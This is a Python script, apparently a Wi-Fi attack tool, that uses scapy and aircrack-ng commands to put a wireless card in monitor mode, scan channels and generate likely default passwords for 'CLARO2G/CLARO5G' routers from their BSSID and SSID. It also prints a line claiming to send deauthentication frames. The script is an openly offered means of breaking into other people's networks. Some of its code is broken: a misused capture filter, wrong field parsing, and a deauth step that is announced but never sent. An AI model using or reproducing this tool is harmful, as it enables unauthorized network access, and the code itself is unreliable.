import re
import signal
import time
import os
from scapy.all import *

def handler(signal, frame):
    print("Scan paused. Press Ctrl+C again to exit.")
    time.sleep(1)
    os._exit(0)

def get_networks():
    found_channels = []
    packets = sniff(filter="wlan.fc.type == 0 and wlan.fc.subtype == 4", prn=lambda x: None, timeout=5)
    for packet in packets:
        if packet.haslayer(Dot11):
            if packet.haslayer(Dot11Elt) and packet.getlayer(Dot11Elt).ID == 0:
                channel = packet.getlayer(Dot11Elt).info
                if int(channel) not in found_channels:
                    found_channels.append(int(channel))
    return found_channels

def scan_networks():
    signal.signal(signal.SIGINT, handler)
    print("Scanning for WiFi networks with CLARO2G or CLARO5G in the name...")
    channels = get_networks()
    if not channels:
        print("No WiFi networks found.")
        return

    for channel in channels:
        os.system(f"sudo iwconfig wlan0mon channel {channel}")
        os.system(f"sudo airodump-ng -c {channel} --bssid :: --write /dev/null wlan0mon")

        print(f"\nCH {channel} ]] Elapsed: 5 s ][ [time] Sending DeAuth (code 7) to broadcast")

        try:
            time.sleep(5)
        except KeyboardInterrupt:
            os.system("sudo pkill airodump-ng")
            break

def generate_password(ssid, bssid):
    bssid = re.sub(r'^.{4}', '', bssid, count=1)
    password = bssid + ssid[-2:]
    return password

def get_passwords():
    os.system("sudo airodump-ng --output-format pcap wlan0mon")
    packets = rdpcap("wlan0mon.cap")

    passwords = []

    for packet in packets:
        if packet.haslayer(Dot11):
            ssid = packet.getlayer(Dot11Beacon).info
            if re.search(r"CLARO(2G|5G)", ssid):
                bssid = packet.getlayer(Dot11).addr2
                password = generate_password(ssid, bssid)
                passwords.append(password)

    return passwords

if __name__ == "__main__":
    os.system("sudo airmon-ng start wlan0")
    scan_networks()
    passwords = get_passwords()

    for password in passwords:
        print("Generated password:", password)
